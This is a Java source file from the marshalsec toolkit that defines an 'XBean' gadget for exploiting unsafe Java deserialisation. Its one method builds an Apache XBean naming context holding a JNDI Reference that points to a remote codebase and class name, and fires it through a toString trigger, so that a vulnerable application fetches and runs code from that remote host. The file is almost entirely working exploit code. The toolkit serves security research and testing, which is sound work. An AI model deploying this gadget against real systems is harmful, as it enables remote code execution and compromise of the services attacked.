/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import javax.naming.Context;
import javax.naming.Reference;

import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public interface XBean extends Gadget {

    @Args ( minArgs = 2, args = {
        "codebase", "classname"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeXBean ( UtilFactory uf, String[] args ) throws Exception {
        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("foo", args[ 1 ], args[ 0 ]);
        ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
        return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
    }

}
